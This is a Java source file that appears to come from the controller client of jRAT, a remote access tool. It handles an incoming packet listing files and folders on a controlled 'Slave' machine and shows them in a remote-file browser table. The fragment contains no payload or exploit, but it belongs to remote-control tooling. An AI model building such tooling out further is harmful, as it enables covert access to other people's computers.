package se.jrat.client.packets.incoming;

import java.io.DataInputStream;
import java.util.ArrayList;
import java.util.List;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameRemoteFiles;
import se.jrat.client.utils.IconUtils;
import se.jrat.common.utils.DataUnits;


public class Packet22ListFiles extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameRemoteFiles fr = FrameRemoteFiles.INSTANCES.get(slave);
		List<Object[]> dirs = new ArrayList<Object[]>();
		List<Object[]> files = new ArrayList<Object[]>();

		int len = dis.readInt();

		for (int i = 0; i < len; i++) {
			String line = slave.readLine();

			boolean dir = dis.readBoolean();
			if (dir) {
				boolean hidden = dis.readBoolean();

				if (line != null) {
					dirs.add(new Object[] { line, "", "", hidden ? "Yes" : "" });
				}
			} else {
				String date = slave.readLine();
				String size = DataUnits.getAsString(slave.readLong());
				boolean hidden = dis.readBoolean();

				if (line != null) {
					files.add(new Object[] { line, size, date, hidden ? "Yes" : "" });
				}
			}
		}

		if (fr != null) {
			fr.remoteTable.clear();

			for (Object[] string : dirs) {
				try {
					fr.remoteTable.tableRenderer.icons.put(string[0].toString(), IconUtils.getFileIconFromExtension(string[0].toString(), true));
					fr.remoteTable.tableModel.addRow(new Object[] { string[0], string[1], "", string[3] });
				} catch (Exception e) {
					e.printStackTrace();
				}
			}

			for (Object[] string : files) {
				try {
					fr.remoteTable.tableRenderer.icons.put(string[0].toString(), IconUtils.getFileIconFromExtension(string[0].toString(), false));
					fr.remoteTable.tableModel.addRow(new Object[] { string[0], string[1], string[2], string[3] });
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}

	}

}
